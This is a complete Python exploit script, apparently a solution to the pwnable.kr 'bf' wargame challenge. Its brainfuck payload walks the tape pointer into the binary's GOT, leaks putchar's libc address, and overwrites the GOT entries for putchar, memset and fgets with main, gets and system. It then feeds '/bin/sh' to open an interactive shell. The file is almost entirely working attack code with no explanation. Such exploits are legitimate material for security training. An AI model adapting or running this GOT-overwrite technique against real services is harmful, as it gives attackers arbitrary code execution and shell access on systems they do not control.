from zio import *
c_read  = COLORED(RAW, 'blue')
c_write = COLORED(RAW, 'green')
target  = './bf'
target  = ('pwnable.kr',9001)
io      = zio(target, print_read = c_read, print_write = c_write, timeout = 100000)
io.gdb_hint([0x8048717])

adr_tape    = 0x804a0a0
adr_p       = 0x804a080
got_putchar = 0x804a030
got_memset  = 0x804a02c
got_fgets   = 0x804a010
off_putchar = 0x00677d0
off_system  = 0x003f0b0
off_gets    = 0x0065e90
adr_main    = 0x8048671

#off_putchar = 0x0066480
#off_system  = 0x0040190
#off_fgets   = 0x0063b20

def read_bf():
    return (l32(io.read(4)) - off_putchar)

io.read_until('type some brainfuck instructions except [ ]\n')

payload     =   '<' * (adr_tape - adr_p) 
payload     +=  ','             # write
payload     +=  '..>.>.>.'      # read
payload     +=  '<<<,>,>,>,<<<'    # write
payload     +=  '<' * (got_putchar - got_memset)
payload     +=  ',>,>,>,<<<'
payload     +=  '<' * (got_memset - got_fgets)
payload     +=  ',>,>,>,<<<'
payload     +=  '.'             # invoke

io.writeline(payload)
io.write('\x30')
io.read(1)
libc_base   = read_bf()
adr_system  = libc_base + off_system
adr_gets    = libc_base + off_gets
print ''
print '[+] libc base:       0x%x' % libc_base
print '[+] system address:  0x%x' % adr_system
io.write(l32(adr_main))
io.write(l32(adr_gets))
io.write(l32(adr_system))
io.writeline('/bin/sh\x00')

io.interact()
